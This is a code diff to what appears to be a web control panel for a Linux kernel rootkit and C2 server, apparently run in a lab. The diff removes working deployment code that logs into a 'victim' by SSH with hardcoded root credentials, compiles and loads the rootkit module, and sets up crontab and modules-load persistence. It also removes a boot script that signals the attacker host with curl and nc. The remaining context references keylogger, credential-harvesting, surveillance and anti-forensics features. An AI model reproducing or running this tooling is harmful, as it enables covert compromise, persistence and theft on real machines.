@@ -610,127 +610,6 @@ async def api_dl_delete(filename: str):
     return JSONResponse({"error": "not found"}, 404)
 
 
-VICTIM_SSH_PW = "root"
-VICTIM_SSH_USER = "root"
-SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "IdentitiesOnly=yes",
-            "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
-            "-o", "ConnectTimeout=8"]
-
-
-def _ssh_run(victim_ip, cmd, timeout=30):
-    try:
-        r = subprocess.run(
-            ["sshpass", "-p", VICTIM_SSH_PW, "ssh"] + SSH_OPTS +
-            [f"{VICTIM_SSH_USER}@{victim_ip}", cmd],
-            capture_output=True, text=True, timeout=timeout
-        )
-        return {"output": (r.stdout + r.stderr).strip(), "exit_code": r.returncode}
-    except subprocess.TimeoutExpired:
-        return {"output": "SSH command timed out", "exit_code": -1}
-    except Exception as e:
-        return {"output": f"SSH error: {e}", "exit_code": -1}
-
-
-def _scp_push(victim_ip, local_path, remote_path):
-    import base64
-    try:
-        with open(local_path, "rb") as f:
-            data = f.read()
-        b64_bytes = base64.b64encode(data) + b"\n"
-        r = subprocess.run(
-            ["sshpass", "-p", VICTIM_SSH_PW, "ssh"] + SSH_OPTS +
-            [f"{VICTIM_SSH_USER}@{victim_ip}",
-             f"base64 -d > {remote_path}"],
-            input=b64_bytes, capture_output=True, timeout=120
-        )
-        return {"output": (r.stdout.decode(errors='replace') + r.stderr.decode(errors='replace')).strip(), "exit_code": r.returncode}
-    except Exception as e:
-        return {"output": f"SCP error: {e}", "exit_code": -1}
-
-
-@app.post("/api/deploy/ssh")
-async def api_deploy_ssh(request: Request):
-    token = request.headers.get("X-Token", "")
-    if not check_token(token):
-        return JSONResponse({"error": "not authenticated"}, 401)
-    data = await request.json()
-    cmd = data.get("cmd", "")
-    victim_ip = data.get("victim_ip", "192.168.122.18")
-    if not cmd:
-        return JSONResponse({"error": "no command"}, 400)
-    result = await asyncio.get_event_loop().run_in_executor(
-        None, _ssh_run, victim_ip, cmd
-    )
-    return result
-
-
-@app.post("/api/deploy/push")
-async def api_deploy_push(request: Request):
-    token = request.headers.get("X-Token", "")
-    if not check_token(token):
-        return JSONResponse({"error": "not authenticated"}, 401)
-    data = await request.json()
-    local_path = data.get("local_path", "")
-    remote_path = data.get("remote_path", "")
-    victim_ip = data.get("victim_ip", "192.168.122.18")
-    if not local_path or not remote_path:
-        return JSONResponse({"error": "missing paths"}, 400)
-    if not os.path.exists(local_path):
-        return JSONResponse({"error": f"local file not found: {local_path}"}, 404)
-    result = await asyncio.get_event_loop().run_in_executor(
-        None, _scp_push, victim_ip, local_path, remote_path
-    )
-    return result
-
-
-@app.post("/api/deploy/build")
-async def api_deploy_build(request: Request):
-    token = request.headers.get("X-Token", "")
-    if not check_token(token):
-        return JSONResponse({"error": "not authenticated"}, 401)
-    data = await request.json()
-    victim_ip = data.get("victim_ip", "192.168.122.18")
-    source_dir = "/tmp/_wlkom_build"
-    ko_source = os.path.join(os.path.dirname(__file__), "..", "rootkit", "wlkom.c")
-    if not os.path.exists(ko_source):
-        ko_source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "rootkit", "wlkom.c")
-    if not os.path.exists(ko_source):
-        return JSONResponse({"error": f"wlkom.c not found"}, 404)
-    # Use temp alias "kmod" to avoid rootkit hiding anything named "wlkom"
-    build_dir = "/tmp/_kmod_build"
-    steps = []
-    r = _ssh_run(victim_ip, f"rm -rf {build_dir}; mkdir -p {build_dir}")
-    steps.append({"step": "mkdir", **r})
-    # Rootkit hides ANY line containing "wlkom" from read() — even compiler reads.
-    # Replace all occurrences in source before pushing.
-    import tempfile
-    with open(ko_source, "r") as f:
-        src_code = f.read()
-    src_code = src_code.replace("wlkom", "kmod").replace("zroot", "xroot")
-    tmp_src = tempfile.mktemp(suffix=".c")
-    with open(tmp_src, "w") as f:
-        f.write(src_code)
-    r = _scp_push(victim_ip, tmp_src, f"{build_dir}/kmod.c")
-    os.unlink(tmp_src)
-    steps.append({"step": "push_source", **r})
-    makefile = f'obj-m += kmod.o\nKDIR := /lib/modules/$(shell uname -r)/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\nclean:\n\tmake -C $(KDIR) M=$(PWD) clean\n'
-    mk_local = "/tmp/_kmod_Makefile"
-    with open(mk_local, "w") as f:
-        f.write(makefile)
-    r = _scp_push(victim_ip, mk_local, f"{build_dir}/Makefile")
-    steps.append({"step": "push_makefile", **r})
-    r = _ssh_run(victim_ip, f"cd {build_dir} && make clean 2>&1; make 2>&1", timeout=120)
-    steps.append({"step": "compile", **r})
-    r = _ssh_run(victim_ip, f"test -f {build_dir}/kmod.ko && echo KO_OK || echo KO_FAIL")
-    steps.append({"step": "verify", **r})
-    if "KO_OK" in r.get("output", ""):
-        kdir = _ssh_run(victim_ip, "uname -r").get("output", "").strip()
-        inst_dir = f"/lib/modules/{kdir}/extra"
-        r2 = _ssh_run(victim_ip, f"mkdir -p {inst_dir} && cp {build_dir}/kmod.ko {inst_dir}/kmod.ko")
-        steps.append({"step": "install_ko", **r2})
-    return {"steps": steps, "success": any("KO_OK" in s.get("output", "") for s in steps)}
-
-
 @app.websocket("/ws")
 async def websocket_endpoint(ws: WebSocket):
     global pending_password, awaiting_password, authenticated
@@ -1208,13 +1087,12 @@ let S={
   netTab:'connections', dnsResult:'', hostInfo:'', sniffFilter:'',
   credTab:'recon',
   survTab:'spy',
-  topoHosts:[{ip:'192.168.122.1',hostname:'Gateway',type:'router',os:'Linux (KVM)',ports:[],status:'up'},{ip:'192.168.122.96',hostname:'Attacker',type:'attacker',os:'Linux',ports:[8080,9999],status:'up'},{ip:'192.168.122.18',hostname:'Victim',type:'victim',os:'Linux',ports:[22],status:'compromised'}],
+  topoHosts:[{ip:'192.168.122.1',hostname:'Gateway',type:'router',os:'Linux (KVM)',ports:[],status:'up'},{ip:'192.168.122.167',hostname:'Attacker',type:'attacker',os:'Linux',ports:[8080,9999],status:'up'},{ip:'192.168.122.146',hostname:'Victim',type:'victim',os:'Linux',ports:[22],status:'compromised'}],
   topoScan:false,
   actFilter:'all', actSearch:'',
   cmdOpen:false,
   dataLoaded:false,
-  // Deployment
-  deployLog:[],deployRunning:false,victimIP:'192.168.122.18',attackerIP:'192.168.122.96',
+  victimIP:'192.168.122.146',attackerIP:'192.168.122.167',
   // Port Scanner
   scanResults:[],scanRunning:false,scanTarget:'127.0.0.1',scanPorts:'1-1024',
   // Packet Sniffer
@@ -1558,7 +1436,7 @@ function setupLogin(){
 
 function renderApp(){
   const navSections=[
-    {s:'Operations',items:[{id:'dashboard',icon:'dashboard',l:'Dashboard'},{id:'terminal',icon:'terminal',l:'RTR Terminal'},{id:'filesystem',icon:'folder',l:'File System'},{id:'deploy',icon:'rocket',l:'Deployment'}]},
+    {s:'Operations',items:[{id:'dashboard',icon:'dashboard',l:'Dashboard'},{id:'terminal',icon:'terminal',l:'RTR Terminal'},{id:'filesystem',icon:'folder',l:'File System'}]},
     {s:'Monitoring',items:[{id:'processes',icon:'cpu',l:'Processes'},{id:'network',icon:'network',l:'Network'}]},
     {s:'Intelligence',items:[{id:'keylogger',icon:'keyboard',l:'Keylogger'},{id:'credentials',icon:'key',l:'Credentials'},{id:'surveillance',icon:'camera',l:'Surveillance'},{id:'recon',icon:'monitor',l:'VM Detection'}]},
     {s:'Offensive',items:[{id:'tunnels',icon:'link',l:'Port Forward'}]},
@@ -1970,7 +1848,7 @@ panels.network=function(){
       h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>IP Address</th><th>MAC Address</th><th>Interface</th><th>State</th><th>Vendor</th></tr></thead><tbody>';
       arp.forEach(a=>{
         const stC=a.state==='REACHABLE'?'var(--green)':a.state==='STALE'?'var(--yellow)':a.state==='FAILED'?'var(--red)':'var(--t3)';
-        const known=a.ip==='192.168.122.96'?'Attacker':a.ip==='192.168.122.18'?'Victim':a.ip==='192.168.122.1'?'Gateway':'';
+        const known=a.ip==='192.168.122.167'?'Attacker':a.ip==='192.168.122.146'?'Victim':a.ip==='192.168.122.1'?'Gateway':'';
         h+='<tr><td class="mono" style="font-weight:600;color:var(--t1)">'+a.ip+(known?' <span style="font-size:9px;color:var(--red);font-weight:400">('+known+')</span>':'')+'</td><td class="mono" style="font-size:11px">'+a.mac+'</td><td>'+a.iface+'</td><td><span class="badge" style="background:color-mix(in srgb,'+stC+' 15%,transparent);color:'+stC+'">'+a.state+'</span></td><td style="font-size:10px;color:var(--t3)">'+(a.mac.startsWith('52:54')?'QEMU/KVM':a.mac.startsWith('00:16:3e')?'Xen':'')+'</td></tr>';
       });
       h+='</tbody></table></div>';
@@ -2412,44 +2290,6 @@ panels.activity=function(){
   });
   if(filtered.length===0)h+='<tr><td colspan="3" style="text-align:center;padding:30px;color:var(--t4)">No events to display</td></tr>';
   h+='</tbody></table></div></div>';
-  return h;
-};
-
-/* ===== DEPLOYMENT PANEL ===== */
-panels.deploy=function(){
-  let h='<div class="panel-hdr"><div><div class="panel-title">Deployment Center</div><div class="panel-sub">Push, manage and monitor rootkit deployment</div></div></div>';
-
-  h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">';
-  h+='<div class="card"><div class="card-title">Network Config</div>';
-  h+='<div style="display:flex;flex-direction:column;gap:8px">';
-  h+='<label style="font-size:11px;color:var(--t3)">Attacker IP</label><input class="input" id="dAttIP" value="'+esc(S.attackerIP)+'" onchange="S.attackerIP=this.value">';
-  h+='<label style="font-size:11px;color:var(--t3)">Victim IP</label><input class="input" id="dVicIP" value="'+esc(S.victimIP)+'" onchange="S.victimIP=this.value">';
-  h+='<button class="btn btn-sm" onclick="deployDetectIP()">'+I.refresh+' Auto-Detect IPs</button>';
-  h+='</div></div>';
-
-  h+='<div class="card"><div class="card-title">Quick Actions</div>';
-  h+='<div style="display:flex;flex-direction:column;gap:8px">';
-  h+='<button class="btn btn-sm" onclick="deployCheckRK()">'+I.shield+' Check Rootkit Status</button>';
-  h+='<button class="btn btn-sm btn-danger" onclick="deployReinstall()">'+I.refresh+' Reinstall Rootkit</button>';
-  h+='<button class="btn btn-sm" onclick="deployUninstall()" style="border-color:var(--red)">'+I.trash+' Uninstall Rootkit</button>';
-  h+='<button class="btn btn-sm btn-success" onclick="deployBootNotif()">'+I.bell+' Setup Boot Notification</button>';
-  h+='</div></div></div>';
-
-  h+='<div class="card"><div class="card-title">Auto-Push Rootkit to Victim</div>';
-  h+='<div style="font-size:12px;color:var(--t3);margin-bottom:12px">Push the rootkit .ko file to victim, install it, and set up persistence — all from here.</div>';
-  h+='<div style="display:flex;gap:8px;flex-wrap:wrap">';
-  h+='<button class="btn btn-sm btn-primary" onclick="deployPush()" '+(S.deployRunning?'disabled':'')+'>'+I.rocket+(S.deployRunning?' Deploying...':' Full Deploy')+'</button>';
-  h+='<button class="btn btn-sm" onclick="deployCopyKO()">'+I.upload+' Push .ko Only</button>';
-  h+='</div></div>';
-
-  h+='<div class="card"><div class="card-title">Deployment Log</div>';
-  h+='<div style="background:#000;border-radius:6px;padding:10px;max-height:250px;overflow-y:auto;font-family:var(--font-mono);font-size:11px;line-height:1.7" id="deployLog">';
-  if(S.deployLog.length===0)h+='<span style="color:var(--t4)">No deployment actions yet.</span>';
-  S.deployLog.forEach(l=>{
-    const c=l.type==='error'?'var(--red)':l.type==='success'?'var(--green)':'var(--t3)';
-    h+='<div style="color:'+c+'">'+esc(l.text)+'</div>';
-  });
-  h+='</div></div>';
   return h;
 };
 
@@ -3225,145 +3065,6 @@ async function afRunAll(){
   toast('All anti-forensics actions completed','info');
 }
 
-// === DEPLOYMENT FUNCTIONS ===
-function dlog(type,text){S.deployLog.push({type,text:'['+ts()+'] '+text});if(S.deployLog.length>200)S.deployLog=S.deployLog.slice(-150)}
-function dlogSub(type,text){S.deployLog.push({type,text:'  '+text})}
-
-async function sshExec(cmd,victim_ip){
-  const ip=victim_ip||S.victimIP;
-  const r=await fetch('/api/deploy/ssh',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({cmd,victim_ip:ip})});
-  return await r.json();
-}
-
-async function deployDetectIP(){
-  dlog('info','Auto-detecting IPs...');renderPanel();
-  const r1=await sshExec('hostname -I | awk "{print \\$1}"');
-  if(r1.exit_code===0&&r1.output){S.victimIP=r1.output.trim();dlogSub('success','Victim IP: '+S.victimIP)}
-  else{dlogSub('error','Could not detect victim IP: '+(r1.output||'SSH failed'))}
-  const r2=await sshExec('ip route | grep default | awk "{print \\$3}"');
-  if(r2.exit_code===0&&r2.output)dlogSub('info','Gateway: '+r2.output.trim());
-  const el1=document.getElementById('dAttIP');const el2=document.getElementById('dVicIP');
-  if(el1)el1.value=S.attackerIP;if(el2)el2.value=S.victimIP;
-  renderPanel();
-}
-
-async function deployCheckRK(){
-  dlog('info','Checking rootkit status...');renderPanel();
-  const c2up=S.rkUp&&S.rkAuth;
-  dlogSub(c2up?'success':'warn','C2 connection: '+(c2up?'ACTIVE (encrypted)':'INACTIVE'));
-  if(c2up){
-    const r2=await apiExec('id');
-    dlogSub('success','C2 exec: '+(r2||'').trim().substring(0,60));
-  }
-  const r3=await sshExec('test -f /lib/modules/$(uname -r)/extra/kmod.ko && echo PRESENT || echo MISSING');
-  const koExists=r3.output&&r3.output.includes('PRESENT');
-  dlogSub(koExists?'success':'warn','.ko file: '+(koExists?'PRESENT at /lib/modules/*/extra/kmod.ko':'MISSING — needs build'));
-  const r4=await sshExec('test -f /etc/modules-load.d/kmod.conf && echo FOUND || echo NONE');
-  dlogSub(r4.output&&r4.output.includes('FOUND')?'success':'warn','Persistence (modules-load): '+(r4.output&&r4.output.includes('FOUND')?'CONFIGURED':'NOT SET'));
-  const r5=await sshExec('crontab -l 2>/dev/null | grep -c kmod || echo 0');
-  dlogSub(r5.output&&r5.output.trim()!=='0'?'success':'warn','Persistence (crontab): '+(r5.output&&r5.output.trim()!=='0'?'CONFIGURED':'NOT SET'));
-  const r6=await sshExec('test -f /lib/modules/$(uname -r)/build/Makefile && echo YES || echo NO');
-  dlogSub('info','Kernel headers: '+(r6.output&&r6.output.includes('YES')?'AVAILABLE (can build)':'MISSING'));
-  toast('Status check complete','info');renderPanel();
-}
-
-async function deployReinstall(){
-  dlog('warn','Reinstalling rootkit...');renderPanel();
-  const r1=await sshExec('test -f /lib/modules/$(uname -r)/extra/kmod.ko && echo EXISTS || echo MISSING');
-  if(!r1.output||r1.output.includes('MISSING')){
-    dlogSub('error','.ko file not found — building from source first...');renderPanel();
-    const br=await fetch('/api/deploy/build',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({victim_ip:S.victimIP})});
-    const bd=await br.json();
-    if(bd.error){dlogSub('error','Build failed: '+bd.error);toast('Build failed','error');renderPanel();return}
-    bd.steps.forEach(s=>{dlogSub(s.exit_code===0?'success':'error',s.step+': '+(s.output||'ok').substring(0,120))});
-    if(!bd.success){dlogSub('error','Build failed — cannot reinstall');toast('Build failed','error');renderPanel();return}
-    dlogSub('success','Build successful — .ko ready');
-  }
-  const r2=await sshExec('rmmod kmod 2>/dev/null; insmod /lib/modules/$(uname -r)/extra/kmod.ko 2>&1 && echo INSMOD_OK || echo INSMOD_FAIL');
-  if(r2.output&&r2.output.includes('INSMOD_OK')){
-    dlogSub('success','insmod: rootkit loaded');toast('Rootkit reinstalled','info');
-  }else{
-    dlogSub('error','insmod: '+(r2.output||'failed'));toast('Reinstall failed','error');
-  }
-  renderPanel();
-}
-
-async function deployUninstall(){
-  if(!confirm('Uninstall rootkit? This will remove the module and all persistence. The .ko file will be kept for reinstall.'))return;
-  dlog('warn','Uninstalling rootkit...');renderPanel();
-  const steps=[
-    {desc:'Remove module',cmd:'rmmod kmod 2>&1; echo RMMOD_DONE'},
-    {desc:'Remove modules-load.d',cmd:'rm -f /etc/modules-load.d/kmod.conf && echo OK'},
-    {desc:'Clean crontab',cmd:'crontab -l 2>/dev/null | grep -v kmod | crontab - 2>&1 && echo OK'},
-    {desc:'Remove systemd unit',cmd:'rm -f /etc/systemd/system/.kmod.service && systemctl daemon-reload 2>/dev/null; echo OK'},
-    {desc:'Clean rc.local',cmd:'sed -i "/kmod/d" /etc/rc.local 2>/dev/null; echo OK'},
-    {desc:'Remove boot script',cmd:'rm -f /usr/local/bin/.kmod_boot.sh; echo OK'},
-  ];
-  for(const s of steps){
-    const r=await sshExec(s.cmd);
-    dlogSub(r.exit_code===0?'success':'warn',s.desc+': '+(r.output||'done').substring(0,80));
-    renderPanel();
-  }
-  dlog('success','Rootkit uninstalled (note: .ko kept at /lib/modules/*/extra/ for reinstall)');
-  toast('Rootkit uninstalled','warn');renderPanel();
-}
-
-async function deployBootNotif(){
-  dlog('info','Setting up boot notification...');renderPanel();
-  const script='#!/bin/bash\\nsleep 10\\ncurl -s http://'+S.attackerIP+':8080/api/status >/dev/null 2>&1\\necho BOOT_NOTIFY $(hostname) $(hostname -I) | nc -w2 '+S.attackerIP+' 9998 2>/dev/null\\ninsmod /lib/modules/$(uname -r)/extra/kmod.ko 2>/dev/null';
-  const cmd='printf "'+script+'" > /usr/local/bin/.kmod_boot.sh && chmod +x /usr/local/bin/.kmod_boot.sh && (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/.kmod_boot.sh") | sort -u | crontab - && echo NOTIF_OK';
-  const r=await sshExec(cmd);
-  if(r.output&&r.output.includes('NOTIF_OK')){
-    dlogSub('success','Boot script installed at /usr/local/bin/.kmod_boot.sh');
-    dlogSub('success','Crontab @reboot entry added');
-    dlogSub('info','On boot: notifies C2 + auto-loads rootkit');
-    toast('Boot notification configured','info');
-  }else{
-    dlogSub('error','Setup failed: '+(r.output||'SSH error'));
-    toast('Boot notification failed','error');
-  }
-  renderPanel();
-}
-
-async function deployPush(){
-  S.deployRunning=true;
-  dlog('info','Starting full deployment...');renderPanel();
-  dlogSub('info','Step 1/4: Building rootkit from source...');renderPanel();
-  const br=await fetch('/api/deploy/build',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({victim_ip:S.victimIP})});
-  const bd=await br.json();
-  if(bd.error){dlogSub('error','Build error: '+bd.error);S.deployRunning=false;renderPanel();return}
-  bd.steps.forEach(s=>{dlogSub(s.exit_code===0?'info':'warn',s.step+': '+(s.output||'ok').substring(0,120))});
-  if(!bd.success){dlogSub('error','Build FAILED — aborting');S.deployRunning=false;toast('Build failed','error');renderPanel();return}
-  dlogSub('success','Build OK — kmod.ko compiled and installed');
-
-  dlogSub('info','Step 2/4: Loading rootkit module...');renderPanel();
-  const r1=await sshExec('rmmod kmod 2>/dev/null; insmod /lib/modules/$(uname -r)/extra/kmod.ko 2>&1 && echo INSMOD_OK || echo INSMOD_FAIL');
-  if(r1.output&&r1.output.includes('INSMOD_OK')){dlogSub('success','insmod: rootkit loaded')}
-  else{dlogSub('warn','insmod: '+(r1.output||'no output')+' — module may already be loaded')}
-
-  dlogSub('info','Step 3/4: Setting up persistence...');renderPanel();
-  await sshExec('echo kmod > /etc/modules-load.d/kmod.conf');
-  await sshExec('(crontab -l 2>/dev/null; echo "@reboot insmod /lib/modules/$(uname -r)/extra/kmod.ko") | sort -u | crontab -');
-  dlogSub('success','Persistence: modules-load.d + crontab configured');
-
-  dlogSub('info','Step 4/4: Setting up boot notification...');renderPanel();
-  await deployBootNotif();
-
-  dlog('success','Full deployment complete!');
-  S.deployRunning=false;toast('Deployment complete','info');renderPanel();
-}
-
-async function deployCopyKO(){
-  dlog('info','Building and pushing .ko only (no insmod)...');renderPanel();
-  const br=await fetch('/api/deploy/build',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({victim_ip:S.victimIP})});
-  const bd=await br.json();
-  if(bd.error){dlogSub('error','Build error: '+bd.error);renderPanel();return}
-  bd.steps.forEach(s=>{dlogSub(s.exit_code===0?'info':'warn',s.step+': '+(s.output||'ok').substring(0,120))});
-  if(bd.success){dlogSub('success','.ko built and installed at /lib/modules/*/extra/kmod.ko');toast('.ko pushed','info')}
-  else{dlogSub('error','Build failed');toast('Build failed','error')}
-  renderPanel();
-}
-
 // === PORT SCANNER FUNCTIONS ===
 const COMMON_PORTS={21:'ftp',22:'ssh',23:'telnet',25:'smtp',53:'dns',80:'http',110:'pop3',111:'rpcbind',135:'msrpc',139:'netbios',143:'imap',443:'https',445:'smb',993:'imaps',995:'pop3s',1433:'mssql',1521:'oracle',3306:'mysql',3389:'rdp',5432:'postgres',5900:'vnc',6379:'redis',8080:'http-alt',8443:'https-alt',9999:'c2',27017:'mongodb'};
 async function runPortScan(){
@@ -3617,7 +3318,6 @@ async function harvestAll(){
 async function selfDestruct(){
   toast('SELF-DESTRUCT initiated...','warn');
   addEv('rootkit','SELF-DESTRUCT initiated');
-  S.deployLog.push({type:'error',text:'['+ts()+'] SELF-DESTRUCT initiated!'});
   const steps=[
     {desc:'Remove persistence configs',cmd:'rm -f /etc/modules-load.d/zroot.conf /etc/modprobe.d/zroot.conf;echo OK'},
     {desc:'Remove crontab entries',cmd:'crontab -l 2>/dev/null|grep -v zroot|crontab -;echo OK'},
@@ -3655,7 +3355,6 @@ function renderCmdPal(){
     {l:'Dashboard',k:'dashboard',icon:I.dashboard},
     {l:'RTR Terminal',k:'terminal',icon:I.terminal},
     {l:'File System',k:'filesystem',icon:I.folder},
-    {l:'Deployment',k:'deploy',icon:I.rocket},
     {l:'Processes',k:'processes',icon:I.cpu},
     {l:'Network',k:'network',icon:I.network},
     {l:'Keylogger',k:'keylogger',icon:I.keyboard},
